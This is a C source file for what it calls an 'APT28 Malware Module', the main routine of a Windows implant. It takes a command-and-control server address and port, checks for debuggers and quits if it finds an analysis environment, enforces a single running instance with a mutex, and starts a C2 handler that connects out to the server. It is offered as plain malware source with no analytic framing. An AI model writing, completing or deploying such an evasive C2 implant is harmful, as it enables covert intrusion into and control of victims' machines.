#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#include "c2_handler.c"
#include "debug_check.c"
#include "mutex.c"

void print_usage(const char *program_name) {
    printf("Usage: %s [OPTIONS]\n", program_name);
    printf("Options:\n");
    printf("  -s, --server <address>    C2 server address (default: 127.0.0.1)\n");
    printf("  -p, --port <port>         C2 server port (default: 8080)\n");
    printf("  -h, --help                Show this help message\n");
    printf("\nExample:\n");
    printf("  %s -s 192.168.1.100 -p 443\n", program_name);
}

int main(int argc, char* argv[]) {
    char *server_address = NULL;
    int server_port = 0;
    
    // Parse command-line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--server") == 0) {
            if (i + 1 < argc) {
                server_address = argv[++i];
            } else {
                printf("[!] Error: --server requires an argument\n");
                print_usage(argv[0]);
                return 1;
            }
        } else if (strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--port") == 0) {
            if (i + 1 < argc) {
                server_port = atoi(argv[++i]);
                if (server_port <= 0 || server_port > 65535) {
                    printf("[!] Error: Invalid port number\n");
                    return 1;
                }
            } else {
                printf("[!] Error: --port requires an argument\n");
                print_usage(argv[0]);
                return 1;
            }
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_usage(argv[0]);
            return 0;
        } else {
            printf("[!] Error: Unknown option: %s\n", argv[i]);
            print_usage(argv[0]);
            return 1;
        }
    }
    
    // Set C2 server configuration if provided
    if (server_address || server_port > 0) {
        set_c2_server(server_address, server_port);
    }
    
    printf("[*] APT28 Malware Module Starting...\n");
    printf("[*] C2 Server: %s:%d\n", server_address ? server_address : "127.0.0.1", server_port > 0 ? server_port : 8080);
    printf("[*] Performing debugger detection...\n");

    // Check if debugged by multiple methods
    BOOL isDebuggedMultiple = IsDebuggerDetectedMultiple();

    if (isDebuggedMultiple) {
        printf("[!] WARNING: Debugger detected by multiple methods!\n");
        printf("[!] Analysis environment detected. Terminating...\n");
        exit(1);
    }

    printf("[+] No multi-method debugger detection.\n");

    // Create mutex to prevent multiple instances
    SingleInstanceMutex* instanceMutex = CreateSingleInstanceMutex();
    if (instanceMutex == NULL) {
        printf("[!] Another instance is already running. Exiting...\n");
        exit(1);
    }
    printf("[+] Single instance mutex acquired. Continuing execution.\n");

    printf("[*] Proceeding with malware operations...\n");

    // Initialize C2 handler
    printf("[*] Initializing C2 handler...\n");
    start_c2_handler();

    // Keep the program running
    while (1) {
        Sleep(1000);
    }

    printf("[*] APT28 Malware Module Finished.\n");
    return 0;
}
